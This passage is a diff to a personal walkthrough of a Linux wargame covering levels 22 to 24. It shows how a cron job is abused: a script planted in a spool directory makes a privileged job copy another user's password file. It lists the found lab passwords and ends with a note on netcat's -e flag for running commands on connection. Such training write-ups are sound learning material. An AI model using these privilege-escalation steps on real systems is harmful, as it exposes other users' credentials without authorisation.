@@ -321,6 +321,45 @@ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 
 password: `Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI`
 
+## Level 22 to Level 23
+to find password:
+
+The hint tells us to look in /etc/cron.d/ and there is a file called cronjob_bandit23 so let's look there.
+```bash
+`less /etc/cron.d/cronjob_bandit23` # tells us `/usr/bin/cronjob_bandit23.sh` is being run.
+`less /usr/bin/cronjob_bandit23.sh` # Some interesting stuff, we can probably figure out what it does. Let's just run it though.
+```
+
+```bash
+myname=bandit23 # change this to bandit23 because otherwise it will think we're bandit22
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) # does some fancy stuff to mutate the directory name
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget" # does an output that tells us where to look, tells us "Copying passwordfile /etc/bandit_pass/bandit23 to /tmp/8ca319486bfbbc3663ea0fbe81326349"
+cat /tmp/$mytarget # tells us the password
+```
+
+password: `jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`
+
+## Level 23 to Level 24
+Following the hints again:
+
+```bash
+less /etc/cron.d/cronjob_bandit24 # tells us to look at /usr/bin/cronjob_bandit24.sh
+less /usr/bin/cronjob_bandit24.sh # the hint tells us what this does, but basically it will run a script we create in /var/spool/bandit24
+```
+
+Let's create the following:
+
+```bash
+mkdir /tmp/graeme24_test/
+touch /tmp/graeme24_test/pass24.txt
+chmod 777 /tmp/graeme24_test/pass24.txt
+echo "cat /etc/bandit_pass/bandit24 > /tmp/graeme24_test/pass24.txt" > /var/spool/bandit24/bandit24.sh
+chmod 777 /var/spool/bandit24/bandit24.sh
+```
+
+Then we need to wait a minute for the cron job to run, and we can collect our password: `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`
+
+## Level 24 to Level 25
 # Things to drill down on
 1) From 20 -> 21: why can I `echo <stuff> | nc -l -p 60606`? Does it effectively run `nc -l -p 60606 -e "echo <stuff>"`? What else can I pipe to nc? nc also takes a -c/-e flag where it can accept a script or binary to run when connections are made.
 2)
